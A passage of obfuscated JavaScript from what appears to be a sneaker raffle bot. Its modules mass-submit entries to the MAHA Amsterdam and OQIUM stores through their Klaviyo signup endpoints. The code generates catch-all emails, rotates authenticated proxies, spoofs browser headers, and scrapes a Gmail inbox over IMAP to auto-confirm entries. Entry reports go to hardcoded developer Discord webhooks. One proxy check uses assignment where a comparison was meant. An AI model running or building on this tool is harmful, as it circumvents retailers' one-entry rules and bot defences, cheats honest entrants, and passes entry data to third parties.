                            if (_0x5665da == 'yes' && _0x12fd03 != 0x5) {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0xd6351a['name'] + ']\x20Task\x20' + (_0x67a87f + 0x1) + '\x20:\x20Retrying')), _0x67a87f = _0x67a87f - 0x1, _0x12fd03 = _0x12fd03 + 0x1;
                                continue;
                            }
                            _0x5665da == 'yes' && _0x12fd03 >= 0x5 && (_0x29ff38(_0x10bbca[_0x67a87f], _0xd6351a), _0x5665da = 'no', _0x12fd03 = 0x0), console['log']('Waiting\x20for\x20' + _0x196f8e['AfewDelay'] + '\x20ms'), await _0x54262e(_0x196f8e['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x586edb, _0x2c5deb, _0x2d647d) {
                    for (var _0x1d8e4b = 0x0; _0x1d8e4b < _0x2c5deb['length']; _0x1d8e4b++) {
                        async function _0x589068(_0x1842d9, _0x2d06f6, _0x149a6c, _0x90f469, _0x222495) {
                            var _0xb8a5b5, _0x7ce1bd = {}, _0x23182f = [], _0x464d2a = {}, _0x56e32a = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x30b215 = Math['round'](Math['random']() * (_0x56e32a['length'] - 0x1));
                            !_0x90f469 && (_0x90f469 = {});
                            if (_0x2d06f6 != 'ver') {
                                _0x3feae7(_0x149a6c['name'] + '\x20Task\x20' + (_0x1842d9 + 0x1) + '\x20/\x20' + _0x90f469['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24), await _0x2e3034(_0x90f469, _0x1842d9), _0x7ce1bd = _0x149a6c['data'];
                                _0x2d06f6 == 'exp' ? _0x7ce1bd['data']['attributes']['email'] = '' + _0x90f469[_0x1842d9]['FirstName'] + _0x90f469[_0x1842d9]['LastName'] + _0x196f8e['catchall'] : _0x7ce1bd['data']['attributes']['email'] = '' + _0x90f469[_0x1842d9]['Email'];
                                if (_0x90f469[_0x1842d9]['Size'] == 'RANDOM') {
                                }
                                _0x7ce1bd['data']['attributes']['properties']['$first_name'] = '' + _0x90f469[_0x1842d9]['FirstName'], _0x7ce1bd['data']['attributes']['properties']['$last_name'] = '' + _0x90f469[_0x1842d9]['LastName'], _0x7ce1bd['data']['attributes']['properties']['$address1'] = _0x90f469[_0x1842d9]['Address1'] + '\x20' + _0x90f469[_0x1842d9]['Address2'] + '\x20' + _0x90f469[_0x1842d9]['HouseNumber'], _0x7ce1bd['data']['attributes']['properties']['$zip'] = '' + _0x90f469[_0x1842d9]['Zip'], _0x7ce1bd['data']['attributes']['properties']['$city'] = '' + _0x90f469[_0x1842d9]['City'], _0x7ce1bd['data']['attributes']['properties']['$country'] = '' + _0x90f469[_0x1842d9]['Country'], _0x90f469[_0x1842d9]['Size'] == 'RANDOM' ? _0x7ce1bd['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x56e32a[_0x30b215] : _0x7ce1bd['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x90f469[_0x1842d9]['Size'], _0x7ce1bd['data']['attributes']['properties']['$phone_number'] = '' + _0x90f469[_0x1842d9]['Phone'], _0x7ce1bd['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x90f469[_0x1842d9]['Follower'];
                            }
                            if (_0x196f8e['useRandomProxy'] = ![])
                                var _0x15feda = _0x222495[_0x1842d9]['split'](':');
                            else
                                var _0x4f293c = Math['round'](Math['random']() * (_0x222495['length'] - 0x1)), _0x15feda = _0x222495[_0x4f293c]['split'](':');
                            var _0x47b934 = {
                                'jar': _0x3b7fa9,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x149a6c['url'],
                                'headers': _0x149a6c['headers'],
                                'body': JSON['stringify'](_0x7ce1bd),
                                'proxy': 'http://' + _0x15feda[0x2] + ':' + _0x15feda[0x3] + '@' + _0x15feda[0x0] + ':' + _0x15feda[0x1]
                            };
                            return _0x2d06f6 != 'ver' && (_0x47b934['url'] = _0x149a6c['url'], _0x47b934['headers'] = _0x149a6c['headers']), _0x2d06f6 == 'ver' && (_0x47b934['method'] = 'GET'), new Promise(function (_0x29a608, _0x3977c9) {
                                callback = async (_0x3dddcc, _0x5697c0, _0x34192c) => {
                                    if (!_0x3dddcc && _0x5697c0['statusCode'] == 0xca || !_0x3dddcc && _0x5697c0['statusCode'] == 0xc8) {
                                        if (_0x2d06f6 != 'ver') {
                                            var _0x33f167 = await _0x107feb(_0x90f469[_0x1842d9], _0x149a6c, 'dev', ![]), _0x4a74da = await _0x107feb(_0x90f469[_0x1842d9], _0x149a6c, 'pub', ![]);
                                            const _0x152119 = {
                                                'succesDEVMSG': { 'embeds': [_0x33f167] },
                                                'succesPUBMSG': { 'embeds': [_0x4a74da] }
                                            };
                                            if (_0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '')
                                                try {
                                                    await _0x459a7f(_0x196f8e['webhook'], _0x152119['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x152119['succesDEVMSG']), await _0x54262e(0xc8);
                                            try {
                                                await _0x459a7f(_0xf106b7, _0x152119['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x3444cf(_0x90f469[_0x1842d9], _0x149a6c);
                                        }
                                        _0x29a608(console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x149a6c['name'] + ']\x20Task\x20' + (_0x1842d9 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x2d06f6 != 'ver') {
                                            var _0x59a50d = '' + _0x3dddcc, _0x553a5e = await _0x107feb(_0x90f469[_0x1842d9], _0x149a6c, 'dev', !![], _0x59a50d), _0x1c8db2 = {};
                                            _0x1c8db2['errorDEV'] = { 'embeds': [_0x553a5e] }, _0x29ff38(_0x90f469[_0x1842d9], _0x149a6c), _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x1c8db2['errorDEV']), await _0x459a7f(_0x491127, _0x1c8db2['errorDEV']);
                                        }
                                        _0x3977c9(console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x149a6c['name'] + ']\x20Task\x20' + (_0x1842d9 + 0x1) + ':\x20' + _0x3dddcc)));
                                    }
                                };
                                try {
                                    _0x2d06f6 != 'ver' && console['log'](_0x508dba() + '\x20[' + _0x149a6c['name'] + ']\x20Task\x20' + (_0x1842d9 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x7ce1bd['data']['attributes']['email']), _0x2ed36a(_0x47b934, callback);
                                } catch (_0x1f3f7a) {
                                    console['log'](_0x508dba() + '\x20Task\x20' + (_0x1842d9 + 0x1) + ':\x20' + _0x1f3f7a);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x589068(_0x1d8e4b, 'nor', _0x586edb, _0x2c5deb, _0x2d647d), console['log'](_0x508dba() + '\x20[' + _0x586edb['name'] + ']\x20Sleeping\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                        } catch (_0x3c8aaa) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x52e472, _0x57a4fc, _0x2b0484) {
                    var _0x1c3757 = [], _0x1d6dda = ![];
                    async function _0x3dfc23() {
                        var _0x3493e2 = new _0x5deaaa({
                            'user': _0x196f8e['masterMail'],
                            'password': _0x196f8e['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1c1cd8(_0xfd5351) {
                            _0x3493e2['openBox']('INBOX', ![], _0xfd5351);
                        }
                        _0x3493e2['once']('ready', function () {
                            _0x1c1cd8(function (_0x1fa636, _0x219b63) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1fa636)
                                    throw _0x1fa636;
                                _0x3493e2['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x5142e9, _0x49188a) {
                                    if (!_0x49188a || !_0x49188a['length'])
                                        console['log'](_0x508dba() + '\x20[' + _0x52e472['name'] + ']\x20No\x20mails\x20found'), _0x3493e2['end']();
                                    else {
                                        var _0x1b74ed = _0x3493e2['seq']['fetch'](_0x49188a, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x1b74ed['on']('message', function (_0x310540, _0x113f82) {
                                            var _0x2db21a = '(#' + _0x113f82 + ')\x20';
                                            _0x310540['on']('body', function (_0x143b3d, _0x55f56e) {
                                                _0x45f099(_0x143b3d, (_0x27582f, _0x34b119) => {
                                                    var _0x150862 = _0x34b119['text']['split']('(')[0x1], _0xe7d842 = _0x150862['split'](')')[0x0];
                                                    _0x1c3757['push'](_0xe7d842);
                                                });
                                            }), _0x310540['once']('end', function () {
                                            });
                                        }), _0x1b74ed['once']('error', function (_0x3ac563) {
                                            console['log']('Fetch\x20error:\x20' + _0x3ac563), _0x1d6dda = !![];
                                        }), _0x1b74ed['once']('end', function () {
                                            _0x3493e2['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3493e2['once']('error', function (_0xd3ab14) {
                            console['log'](_0x351e10['red'](_0xd3ab14['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1d6dda = !![];
                        }), _0x3493e2['once']('end', async function () {
                            _0x1d6dda = !![];
                        }), _0x3493e2['connect']();
                    }
                    async function _0x2084d7(_0x2a0b29, _0x1caa0b, _0x1db638) {
                        for (var _0xf2bd39 = 0x0; _0xf2bd39 < _0x1caa0b['length']; _0xf2bd39++) {
                            async function _0x396fb6(_0x45001f, _0x24034e, _0x5b80e7, _0x3bee41, _0x16e832) {
                                var _0x4514ae, _0x53b8e9 = {}, _0x1a371a = [], _0x2a425f = {}, _0x2f01c7 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x3e8585 = Math['round'](Math['random']() * (_0x2f01c7['length'] - 0x1));
                                _0x3bee41[_0x45001f]['Size'] == 'RANDOM' && (_0x3bee41[_0x45001f]['Size'] = _0x2f01c7[_0x3e8585]);
                                !_0x3bee41 && (_0x3bee41 = {});
                                if (_0x196f8e['useRandomProxy'] = ![])
                                    var _0x3d6c15 = _0x16e832[_0x45001f]['split'](':');
                                else
                                    var _0x21a309 = Math['round'](Math['random']() * (_0x16e832['length'] - 0x1)), _0x3d6c15 = _0x16e832[_0x21a309]['split'](':');
                                var _0x42cc20 = {
                                    'jar': _0x3b7fa9,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5b80e7['url'],
                                    'headers': _0x5b80e7['headers'],
                                    'body': JSON['stringify'](_0x53b8e9),
                                    'proxy': 'http://' + _0x3d6c15[0x2] + ':' + _0x3d6c15[0x3] + '@' + _0x3d6c15[0x0] + ':' + _0x3d6c15[0x1]
                                };
                                return _0x24034e != 'ver' && (_0x42cc20['url'] = _0x5b80e7['url'], _0x42cc20['headers'] = _0x5b80e7['headers']), _0x24034e == 'ver' && (_0x42cc20['method'] = 'GET', _0x42cc20['url'] = _0x3bee41[_0x45001f]), new Promise(function (_0xfdbc39, _0x3649f5) {
                                    callback = async (_0x1c8eb6, _0x1d99c1, _0x47ae33) => {
                                        if (!_0x1c8eb6 && _0x1d99c1['statusCode'] == 0xca || !_0x1c8eb6 && _0x1d99c1['statusCode'] == 0xc8) {
                                            if (_0x24034e != 'ver') {
                                                var _0x5921dd = await _0x107feb(_0x3bee41[_0x45001f], _0x5b80e7, 'dev', ![]), _0x58160f = await _0x107feb(_0x3bee41[_0x45001f], _0x5b80e7, 'pub', ![]);
                                                const _0x5a32dc = {
                                                    'succesDEVMSG': { 'embeds': [_0x5921dd] },
                                                    'succesPUBMSG': { 'embeds': [_0x58160f] }
                                                };
                                                if (_0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '')
                                                    try {
                                                        await _0x459a7f(_0x196f8e['webhook'], _0x5a32dc['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x5a32dc['succesDEVMSG']), await _0x54262e(0xc8);
                                                try {
                                                    await _0x459a7f(_0xf106b7, _0x5a32dc['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3444cf(_0x3bee41[_0x45001f], _0x5b80e7);
                                            }
                                            _0xfdbc39(console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x5b80e7['name'] + ']\x20Task\x20' + (_0x45001f + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x24034e != 'ver') {
                                                var _0x5ce6aa = '' + _0x1c8eb6, _0x1a2404 = await _0x107feb(_0x3bee41[_0x45001f], _0x5b80e7, 'dev', !![], _0x5ce6aa), _0x444a62 = {};
                                                _0x444a62['errorDEV'] = { 'embeds': [_0x1a2404] }, _0x29ff38(_0x3bee41[_0x45001f], _0x5b80e7), _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x444a62['errorDEV']), await _0x459a7f(_0x491127, _0x444a62['errorDEV']);
                                            }
                                            _0x3649f5(console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x5b80e7['name'] + ']\x20Task\x20' + (_0x45001f + 0x1) + ':\x20' + _0x1c8eb6)));
                                        }
                                    };
                                    try {
                                        _0x24034e != 'ver' ? console['log'](_0x508dba() + '\x20[' + _0x5b80e7['name'] + ']\x20Task\x20' + (_0x45001f + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x53b8e9['data']['attributes']['email']) : console['log'](_0x508dba() + '\x20[' + _0x5b80e7['name'] + ']\x20Task\x20' + (_0x45001f + 0x1) + ':\x20Fetching\x20Response'), _0x2ed36a(_0x42cc20, callback);
                                    } catch (_0x1af8dd) {
                                        console['log'](_0x508dba() + '\x20Task\x20' + (_0x45001f + 0x1) + ':\x20' + _0x1af8dd);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x396fb6(_0xf2bd39, 'ver', _0x2a0b29, _0x1caa0b, _0x1db638), console['log'](_0x508dba() + '\x20[' + _0x2a0b29['name'] + ']\x20Sleeping\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                            } catch (_0x233b85) {
                            }
                        }
                    }
                    try {
                        _0x3dfc23();
                        while (!_0x1d6dda) {
                            await _0x54262e(0xbb8);
                        }
                        console['log']('Found\x20' + _0x1c3757['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x54262e(0x9c4);
                    }
                    await _0x2084d7(_0x52e472, _0x1c3757, _0x2b0484);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YAQ4Ja',
                            'custom_source': 'DN3707-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TntaQ5',
                                '$consent_form_version': 0x81b1d1,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x17ad51, _0x38356d, _0x29927b) {
                    for (var _0x3aa3d9 = 0x0; _0x3aa3d9 < _0x38356d['length']; _0x3aa3d9++) {
                        async function _0x561b98(_0x3723cd, _0x257f05, _0x55f417, _0x23dc64, _0x6c7d42) {
                            var _0x3b8b91, _0x63d3a0 = {}, _0x275628 = [], _0x5ce51c = {}, _0x3cb82e = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x30c416 = Math['round'](Math['random']() * (_0x3cb82e['length'] - 0x1));
                            !_0x23dc64 && (_0x23dc64 = {});
                            if (_0x257f05 != 'ver') {
                                _0x3feae7(_0x55f417['name'] + '\x20Task\x20' + (_0x3723cd + 0x1) + '\x20/\x20' + _0x23dc64['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24), await _0x2e3034(_0x23dc64, _0x3723cd), _0x275628 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x2ccb52
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x23dc64[_0x3723cd]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x196f8e['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x5c71b0
                                        }
                                    ]
                                }], _0x5ce51c = { 'embeds': _0x275628 }, _0x63d3a0 = _0x55f417['data'];
                                _0x257f05 == 'exp' ? _0x63d3a0['data']['attributes']['email'] = '' + _0x23dc64[_0x3723cd]['FirstName'] + _0x23dc64[_0x3723cd]['LastName'] + _0x196f8e['catchall'] : _0x63d3a0['data']['attributes']['email'] = '' + _0x23dc64[_0x3723cd]['Email'];
                                if (_0x23dc64[_0x3723cd]['Size'] == 'RANDOM') {
                                }
                                _0x63d3a0['data']['attributes']['properties']['$first_name'] = '' + _0x23dc64[_0x3723cd]['FirstName'], _0x63d3a0['data']['attributes']['properties']['$last_name'] = '' + _0x23dc64[_0x3723cd]['LastName'], _0x63d3a0['data']['attributes']['properties']['$address1'] = _0x23dc64[_0x3723cd]['Address1'] + '\x20' + _0x23dc64[_0x3723cd]['Address2'] + '\x20' + _0x23dc64[_0x3723cd]['HouseNumber'], _0x63d3a0['data']['attributes']['properties']['$zip'] = '' + _0x23dc64[_0x3723cd]['Zip'], _0x63d3a0['data']['attributes']['properties']['$city'] = '' + _0x23dc64[_0x3723cd]['City'], _0x63d3a0['data']['attributes']['properties']['$country'] = '' + _0x23dc64[_0x3723cd]['Country'], _0x23dc64[_0x3723cd]['Size'] == 'RANDOM' ? _0x63d3a0['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3cb82e[_0x30c416] : _0x63d3a0['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x23dc64[_0x3723cd]['Size'], _0x63d3a0['data']['attributes']['properties']['$phone_number'] = '' + _0x23dc64[_0x3723cd]['Phone'], _0x63d3a0['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x23dc64[_0x3723cd]['Follower'];
                            }
                            if (_0x196f8e['useRandomProxy'] = ![])
                                var _0x22c0c8 = _0x6c7d42[_0x3723cd]['split'](':');
                            else
                                var _0x401225 = Math['round'](Math['random']() * (_0x6c7d42['length'] - 0x1)), _0x22c0c8 = _0x6c7d42[_0x401225]['split'](':');
                            var _0x1e597b = {
                                'jar': _0x3b7fa9,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x55f417['url'],
                                'headers': _0x55f417['headers'],
                                'body': JSON['stringify'](_0x63d3a0),
                                'proxy': 'http://' + _0x22c0c8[0x2] + ':' + _0x22c0c8[0x3] + '@' + _0x22c0c8[0x0] + ':' + _0x22c0c8[0x1]
                            };
                            return _0x257f05 != 'ver' && (_0x1e597b['url'] = _0x55f417['url'], _0x1e597b['headers'] = _0x55f417['headers']), _0x257f05 == 'ver' && (_0x1e597b['method'] = 'GET'), new Promise(function (_0x33ccb0, _0x24442a) {
                                callback = async (_0x328c1f, _0x45153d, _0x41151c) => {
                                    if (!_0x328c1f && _0x45153d['statusCode'] == 0xca || !_0x328c1f && _0x45153d['statusCode'] == 0xc8) {
                                        if (_0x257f05 != 'ver') {
                                            var _0x23ebba = await _0x107feb(_0x23dc64[_0x3723cd], _0x55f417, 'dev', ![]), _0x3b4689 = await _0x107feb(_0x23dc64[_0x3723cd], _0x55f417, 'pub', ![]);
                                            const _0x27cb77 = {
                                                'succesDEVMSG': { 'embeds': [_0x23ebba] },
                                                'succesPUBMSG': { 'embeds': [_0x3b4689] }
                                            };
                                            if (_0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '')
                                                try {
                                                    await _0x459a7f(_0x196f8e['webhook'], _0x27cb77['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x27cb77['succesDEVMSG']), await _0x54262e(0xc8);
                                            try {
                                                await _0x459a7f(_0xf106b7, _0x27cb77['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x3444cf(_0x23dc64[_0x3723cd], _0x55f417);
                                        }
                                        _0x33ccb0(console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x55f417['name'] + ']\x20Task\x20' + (_0x3723cd + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x257f05 != 'ver') {
                                            var _0x3735c1 = '' + _0x328c1f, _0x3ecf71 = await _0x107feb(_0x23dc64[_0x3723cd], _0x55f417, 'dev', !![], _0x3735c1), _0x5a67a0 = {};
                                            _0x5a67a0['errorDEV'] = { 'embeds': [_0x3ecf71] }, _0x29ff38(_0x23dc64[_0x3723cd], _0x55f417), _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x5a67a0['errorDEV']), await _0x459a7f(_0x491127, _0x5a67a0['errorDEV']);
                                        }
                                        _0x24442a(console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x55f417['name'] + ']\x20Task\x20' + (_0x3723cd + 0x1) + ':\x20' + _0x328c1f)));
                                    }
                                };
                                try {
                                    _0x257f05 != 'ver' && console['log'](_0x508dba() + '\x20[' + _0x55f417['name'] + ']\x20Task\x20' + (_0x3723cd + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x63d3a0['data']['attributes']['email']), _0x2ed36a(_0x1e597b, callback);
                                } catch (_0x296bd8) {
                                    console['log'](_0x508dba() + '\x20Task\x20' + (_0x3723cd + 0x1) + ':\x20' + _0x296bd8);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x561b98(_0x3aa3d9, 'nor', _0x17ad51, _0x38356d, _0x29927b), console['log'](_0x508dba() + '\x20[' + _0x17ad51['name'] + ']\x20Sleeping\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                        } catch (_0x4ee8a0) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2091f1, _0x10e277, _0x3ffebe) {
                    var _0x10e277 = [], _0x55894b = ![];
                    async function _0x16ed31() {
